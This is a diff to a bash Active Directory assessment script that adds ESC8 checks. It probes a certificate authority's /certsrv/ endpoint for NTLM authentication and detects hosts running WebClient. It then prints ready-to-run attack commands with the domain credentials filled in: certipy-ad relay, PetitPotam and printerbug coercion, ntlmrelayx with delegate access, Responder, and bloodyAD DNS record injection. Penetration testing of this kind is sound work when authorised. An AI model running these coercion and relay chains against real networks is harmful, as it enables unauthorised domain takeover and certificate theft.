@@ -323,6 +323,28 @@ if [ ! -z "$CERTIPY_CMD" ]; then
           if [ ! -z "$CA_IP" ] && [ ! -z "$DC_TEMPLATES" ]; then
             FIRST_DC_TEMPLATE=$(echo "$DC_TEMPLATES" | cut -d',' -f1)
             echo -e "${GREY}       └─ ESC8 - DC Templates: ${DC_TEMPLATES}${NC}"
+
+            # ESC8 reachability + WebClient cross-reference
+            CA_HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "http://$CA_IP/certsrv/" 2>/dev/null)
+            CA_NTLM_HEADER=$(curl -sk -D - --max-time 5 "http://$CA_IP/certsrv/" 2>/dev/null | grep -i "WWW-Authenticate")
+
+            if [ "$CA_HTTP_CODE" != "000" ] && [ ! -z "$CA_HTTP_CODE" ]; then
+              if echo "$CA_NTLM_HEADER" | grep -qi "NTLM\|Negotiate"; then
+                echo -e "${RED}          └─ /certsrv/ reachable + NTLM confirmed — directly exploitable${NC}"
+              else
+                echo -e "${GREY}          └─ /certsrv/ reachable (HTTP $CA_HTTP_CODE) but no NTLM header${NC}"
+              fi
+            else
+              echo -e "${GREY}          └─ /certsrv/ not reachable from this host — pivot may be required${NC}"
+            fi
+
+            if [ ! -z "$WEBCLIENT_HOSTS" ]; then
+              echo -e "${RED}          └─ WebClient hosts present — HTTP coercion → ESC8 chain viable${NC}"
+              echo "$WEBCLIENT_HOSTS" | while read -r wc_host; do
+                echo -e "${GREY}             Coerce: $wc_host → relay to http://$CA_IP/certsrv/${NC}"
+              done
+            fi
+
             echo -e "${GREY}          1) certipy-ad relay -target https://${CA_IP}/certsrv/certfnsh.asp -ca ${CA_HOST%%.*} -template ${FIRST_DC_TEMPLATE}${NC}"
             echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> $DC_IP${NC}"
             echo -e "${GREY}          3) certipy-ad auth -pfx <output>.pfx -dc-ip ${DC_IP}${NC}"
@@ -515,6 +537,20 @@ if [ ! -z "$ADIDNS_CREATECHILD" ]; then
   echo -e "${GREY}       └─ bloodyAD -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' --host $DC_IP add dnsRecord <hostname> <YOUR_IP>${NC}"
 else
   echo -e "${GREEN}[OK] ADIDNS zone write access is restricted (no ADIDNS Poisoning)${NC}"
+fi
+
+# WebDAV detection
+WEBCLIENT_HOSTS=$(nxc smb $SCAN_TARGETS_STR -u "$AD_USER" -p "$PASSWORD" -M webdav 2>/dev/null | grep "WebClient Service" | grep -v "NOT" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u)
+WEBCLIENT_COUNT=$(echo "$WEBCLIENT_HOSTS" | grep -v "^$" | wc -l)
+if [ "$WEBCLIENT_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $WEBCLIENT_COUNT host(s) with WebClient (WebDAV) running → HTTP coercion possible (SMB signing bypass)${NC}"
+  echo "$WEBCLIENT_HOSTS" | while read -r host; do
+    echo -e "${RED}       └─ $host${NC}"
+    echo -e "${GREY}          └─ ntlmrelayx.py -t ldap://$DC_IP --delegate-access --no-smb-server --http-port 80${NC}"
+    echo -e "${GREY}             responder -I <IF> --lm (or printerbug via HTTP: //$host@<RELAY>/x)${NC}"
+  done
+else
+  echo -e "${GREEN}[OK] No hosts with WebClient (WebDAV) running${NC}"
 fi
 
 echo ""
